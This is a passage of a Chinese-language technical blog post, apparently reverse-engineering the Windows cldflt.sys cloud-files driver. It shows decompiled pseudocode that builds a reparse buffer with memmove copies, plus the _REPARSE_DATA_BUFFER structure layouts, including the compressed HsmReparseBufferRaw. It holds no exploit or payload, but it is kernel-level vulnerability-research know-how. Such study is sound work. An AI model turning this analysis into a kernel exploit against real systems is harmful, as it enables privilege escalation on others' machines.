&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)P &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (_DWORD)v54 &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (_WORD)v55 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v167 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v8[v54];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v167 &lt;span style="color:#f92672">=&lt;/span> v32;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PoolWithTag &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#a6e22e">ExAllocatePoolWithTag&lt;/span>(PagedPool, &lt;span style="color:#ae81ff">0x4000u&lt;/span>i64, &lt;span style="color:#ae81ff">0x70527348u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v142 &lt;span style="color:#f92672">=&lt;/span> PoolWithTag;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)PoolWithTag;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( PoolWithTag )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(PoolWithTag, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x4000u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v57 &lt;span style="color:#f92672">=&lt;/span> InputBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v58 &lt;span style="color:#f92672">=&lt;/span> v11 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v8 &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xAu&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v57 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v59 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)(v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> v57;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_DWORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v57 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>pReF&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>i64 &lt;span style="color:#f92672">*&lt;/span> v57);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v59 &lt;span style="color:#f92672">+=&lt;/span> v109;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>) &lt;span style="color:#f92672">|=&lt;/span> &lt;span style="color:#ae81ff">1u&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v59 &lt;span style="color:#f92672">=&lt;/span> (v113 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFC&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v59 &lt;span style="color:#f92672">+=&lt;/span> v114;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v117 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)v167;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v107 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)Src;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v59 &lt;span style="color:#f92672">=&lt;/span> (v118 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFC&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">17&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">33&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> v119;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v121 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v59;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_DWORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">17&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> v121;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">&amp;amp;&lt;/span>v58[v121] &lt;span style="color:#f92672">!=&lt;/span> v117 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memmove&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>v58[v121], v117, v120);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v125 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v126 &lt;span style="color:#f92672">=&lt;/span> v125;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(HSM_ELEMENT_INFO &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v58[&lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v125 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v124&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ElementInfos[v125];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memmove&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>v58[&lt;span style="color:#f92672">*&lt;/span>v59], (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)v124 &lt;span style="color:#f92672">+&lt;/span> v124&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ElementInfos[v125].Offset, v124&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ElementInfos[v125].Length);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v125;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v58[&lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v126 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v59;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v59 &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v58[&lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v126 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v125 &lt;span style="color:#f92672">&amp;lt;&lt;/span> v124&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NumberOfElements );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v14 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ExFreePoolWithTag&lt;/span>(v14, &lt;span style="color:#ae81ff">0x70527348u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v11 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ExFreePoolWithTag&lt;/span>(v11, &lt;span style="color:#ae81ff">0x70527348u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>搜索&lt;code>Reparse point RtlCompressBuffer&lt;/code>，找到文章，根据
&lt;a href="https://ipvb.gitee.io/windows/2020/04/24/RealPath/" target="_blank">文章&lt;/a> &lt;code>_REPARSE_DATA_BUFFER&lt;/code>定义如下，可以知道传入 &lt;code>HsmpRpiDecompressBuffer&lt;/code>的是 &lt;code>REPARSE_DATA_BUFFER&lt;/code>，其中 &lt;code>ReparseTag&lt;/code>为&lt;code>IO_REPARSE_TAG_CLOUD_3&lt;/code> 值 &lt;code>0x9000301A&lt;/code>
并且在结构体 &lt;code>HsmReparseBufferRaw&lt;/code>的&lt;code>RawData&lt;/code>成员中存储了由 &lt;code>(RtlCompressBuffer&lt;/code>压缩的数据
&lt;code>HsmReparseBufferRaw&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Handled by cldflt.sys!HsmpRpReadBuffer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT Flags; &lt;span style="color:#75715e">// Flags (0x8000 = not compressed)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> USHORT Length; &lt;span style="color:#75715e">// Length of the data (uncompressed)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> BYTE RawData[&lt;span style="color:#ae81ff">1&lt;/span>]; &lt;span style="color:#75715e">// To be RtlDecompressBuffer-ed
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> } HsmReparseBufferRaw;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>_REPARSE_DATA_BUFFER&lt;/code>定义&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _REPARSE_DATA_BUFFER {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG ReparseTag; &lt;span style="color:#75715e">// Reparse tag type
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> USHORT ReparseDataLength; &lt;span style="color:#75715e">// Length of the reparse data
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> USHORT Reserved; &lt;span style="color:#75715e">// Used internally by NTFS to store remaining length
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">union&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Structure for IO_REPARSE_TAG_SYMLINK
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Handled by nt!IoCompleteRequest
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT SubstituteNameOffset;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT SubstituteNameLength;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT PrintNameOffset;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT PrintNameLength;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG Flags;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WCHAR PathBuffer[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Example of distinction between substitute and print names:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> // mklink /d ldrive c:\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> // SubstituteName: c:\\??\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> // PrintName: c:\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } SymbolicLinkReparseBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Structure for IO_REPARSE_TAG_MOUNT_POINT
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Handled by nt!IoCompleteRequest
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT SubstituteNameOffset;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT SubstituteNameLength;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT PrintNameOffset;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT PrintNameLength;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WCHAR PathBuffer[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } MountPointReparseBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Structure for IO_REPARSE_TAG_WIM
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Handled by wimmount!FPOpenReparseTarget-&amp;gt;wimserv.dll
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// (wimsrv!ImageExtract)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> GUID ImageGuid; &lt;span style="color:#75715e">// GUID of the mounted VIM image
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> BYTE ImagePathHash[&lt;span style="color:#ae81ff">0x14&lt;/span>]; &lt;span style="color:#75715e">// Hash of the path to the file within the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// image
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> } WimImageReparseBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Structure for IO_REPARSE_TAG_WOF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Handled by FSCTL_GET_EXTERNAL_BACKING, FSCTL_SET_EXTERNAL_BACKING in
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// NTFS (Windows 10+)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//-- WOF_EXTERNAL_INFO --------------------
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ULONG Wof_Version; &lt;span style="color:#75715e">// Should be 1 (WOF_CURRENT_VERSION)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ULONG Wof_Provider; &lt;span style="color:#75715e">// Should be 2 (WOF_PROVIDER_FILE)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//-- FILE_PROVIDER_EXTERNAL_INFO_V1 --------------------
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ULONG FileInfo_Version; &lt;span style="color:#75715e">// Should be 1 (FILE_PROVIDER_CURRENT_VERSION)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ULONG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FileInfo_Algorithm; &lt;span style="color:#75715e">// Usually 0 (FILE_PROVIDER_COMPRESSION_XPRESS4K)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> } WofReparseBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Structure for IO_REPARSE_TAG_APPEXECLINK
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG StringCount; &lt;span style="color:#75715e">// Number of the strings in the StringList, separated
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// by &amp;#39;\0&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR StringList[&lt;span style="color:#ae81ff">1&lt;/span>]; &lt;span style="color:#75715e">// Multistring (strings separated by &amp;#39;\0&amp;#39;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// terminated by &amp;#39;\0\0&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> } AppExecLinkReparseBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Structure for IO_REPARSE_TAG_WCI (0x80000018)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG Version; &lt;span style="color:#75715e">// Expected to be 1 by wcifs.sys
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ULONG Reserved;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> GUID LookupGuid; &lt;span style="color:#75715e">// GUID used for lookup in wcifs!WcLookupLayer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> USHORT WciNameLength; &lt;span style="color:#75715e">// Length of the WCI subname, in bytes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR WciName[&lt;span style="color:#ae81ff">1&lt;/span>]; &lt;span style="color:#75715e">// The WCI subname (not zero terminated)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> } WcifsReparseBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Handled by cldflt.sys!HsmpRpReadBuffer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> USHORT Flags; &lt;span style="color:#75715e">// Flags (0x8000 = not compressed)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> USHORT Length; &lt;span style="color:#75715e">// Length of the data (uncompressed)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> BYTE RawData[&lt;span style="color:#ae81ff">1&lt;/span>]; &lt;span style="color:#75715e">// To be RtlDecompressBuffer-ed
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> } HsmReparseBufferRaw;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Dummy structure
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UCHAR DataBuffer[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } GenericReparseBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } DUMMYUNIONNAME;
